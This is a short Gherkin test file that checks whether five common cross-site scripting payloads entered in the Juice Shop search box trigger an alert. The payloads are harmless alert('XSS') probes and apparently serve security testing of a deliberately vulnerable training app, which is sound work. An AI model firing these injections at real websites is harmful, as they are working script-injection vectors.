Feature: Test XSS Injection on Juice Shop

  Scenario Outline: Successfully inject multiple XSS payloads into the search box
    Given I am on the Juice Shop search page
    When I enter the payload "<payload>" into the search box
    Then I should see an alert with the message "XSS"

    Examples:
      | payload                                           |
      | <iframe src="javascript:alert('XSS')">            |
      | <img src="x" onerror="alert('XSS')">              |
      | <svg/onload=alert('XSS')>                         |
      | <script>alert('XSS')</script>                     |
      | <a href="javascript:alert('XSS')">Click here</a>  |